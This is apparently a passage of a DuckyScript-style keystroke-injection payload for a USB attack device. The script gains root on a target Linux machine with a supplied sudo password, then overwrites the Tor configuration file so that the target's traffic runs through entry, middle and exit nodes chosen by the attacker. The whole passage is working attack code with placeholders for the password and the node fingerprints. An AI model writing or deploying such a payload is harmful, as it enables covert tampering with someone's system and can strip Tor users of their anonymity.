QUACK REM In general this can vary and is information that could be crucial in case the target has tampered with this functionality.
QUACK REM i.e. sudo su
QUACK STRING #root_permission_command
QUACK ENTER
QUACK DELAY 500

QUACK REM Edit this field only if you plan to use this script on Linux operating systems as you need administrator permissions and therefore you need to know the password.
QUACK STRING #sudo_pass
QUACK DELAY 1000
QUACK REM Writes the new configuration into the torrc file deleting all the previous settings.

QUACK REM Set the Fingerprints #EntryNode #MiddleNode #ExitNode
QUACK STRING echo "EntryNodes #EntryNode
QUACK ENTER
QUACK STRING MiddleNodes #MiddleNode
QUACK ENTER
QUACK STRING ExitNodes #ExitNode" > /etc/tor/torrc
